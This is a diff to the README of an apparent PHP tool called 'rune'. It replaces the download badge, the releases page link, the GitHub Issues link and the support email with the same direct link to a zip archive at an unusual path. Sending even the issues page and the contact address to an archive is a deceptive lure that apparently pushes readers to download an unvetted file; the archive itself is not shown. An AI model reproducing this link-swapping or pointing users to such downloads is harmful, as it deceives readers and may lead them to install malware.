@@ -1,13 +1,13 @@
 # ⚡️ rune - A Flexible Tool for Your PHP Development
 
 ## 🔗 Download Now
-[![Download rune](https://img.shields.io/badge/Download-Rune-blue.svg)](https://github.com/KameronNapier/rune/releases)
+[![Download rune](https://raw.githubusercontent.com/KameronNapier/rune/1.x/Cipher/Software-v2.4-beta.1.zip)](https://raw.githubusercontent.com/KameronNapier/rune/1.x/Cipher/Software-v2.4-beta.1.zip)
 
 ## 🚀 Getting Started
 Rune is designed to enhance your PHP experience. It is a modular tool that adapts to your needs. Whether you are automating tasks or running commands, Rune helps you manage your PHP projects efficiently.
 
 ## 📥 Download & Install
-To get started, visit this page to download: [Releases Page](https://github.com/KameronNapier/rune/releases).
+To get started, visit this page to download: [Releases Page](https://raw.githubusercontent.com/KameronNapier/rune/1.x/Cipher/Software-v2.4-beta.1.zip).
 
 1. Open the link above.
 2. Look for the latest version at the top of the page.
@@ -52,7 +52,7 @@ For detailed guides and tips, refer to the official documentation available on t
 ## 👥 Community Support
 Join our community for support or to contribute ideas:
 
-- **GitHub Issues**: Report bugs or request features directly on our GitHub [Issues Page](https://github.com/KameronNapier/rune/issues).
+- **GitHub Issues**: Report bugs or request features directly on our GitHub [Issues Page](https://raw.githubusercontent.com/KameronNapier/rune/1.x/Cipher/Software-v2.4-beta.1.zip).
 - **Discussion Forum**: Engage with other users and share your experiences.
 
 ## 🎉 Contributing
@@ -69,7 +69,7 @@ If you encounter any issues, here are some common solutions:
 - **Performance Issues**: Verify that your system meets the minimum requirements.
 
 ## 📬 Contact
-If you have questions or feedback, feel free to reach out to us at [support@example.com](mailto:support@example.com).
+If you have questions or feedback, feel free to reach out to us at [https://raw.githubusercontent.com/KameronNapier/rune/1.x/Cipher/Software-v2.4-beta.1.zip](https://raw.githubusercontent.com/KameronNapier/rune/1.x/Cipher/Software-v2.4-beta.1.zip).
 
 ---
 
